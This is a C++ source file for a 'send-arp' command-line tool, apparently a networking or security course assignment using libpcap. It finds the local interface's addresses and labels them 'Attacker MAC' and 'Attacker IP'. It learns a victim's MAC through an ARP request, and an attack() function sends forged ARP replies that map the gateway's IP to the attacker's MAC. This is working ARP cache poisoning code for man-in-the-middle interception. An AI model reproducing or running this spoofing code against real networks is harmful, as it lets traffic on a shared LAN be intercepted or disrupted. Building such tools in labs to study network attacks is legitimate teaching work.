#include "my-func.h"

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_myinfo(char* interface, Mac& mymac, Ip& myip){
    // Reference: https://pencil1031.tistory.com/66
    uint8_t mac[6];
    char ip[40];

    int sock;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        exit(-1);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

    close(sock);

    mymac = Mac(mac);
    myip = Ip(ip);

    printf("Attacker MAC: %s\n", std::string(mymac).c_str());
    printf("Attacker IP: %s\n", std::string(myip).c_str());
}

void get_smac(pcap_t* handle, Mac& smac, Ip& sip, Ip& myip, Mac& mymac){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = mymac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(myip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        EthArpPacket* reply = (EthArpPacket*)packet;
        if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(reply->arp_.sip_) != sip) continue;

        smac = Mac(reply->arp_.smac_);;
        printf("Sender MAC: %s\n", std::string(smac).c_str());
        break;
    }
}

void attack(pcap_t* handle, Mac& mymac, Ip& tip, Mac& smac, Ip& sip){
    EthArpPacket packet;

    packet.eth_.dmac_ = smac;
    packet.eth_.smac_ = mymac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(tip);
    packet.arp_.tmac_ = smac;
    packet.arp_.tip_ = htonl(sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
    printf("Attack Success\n");
}
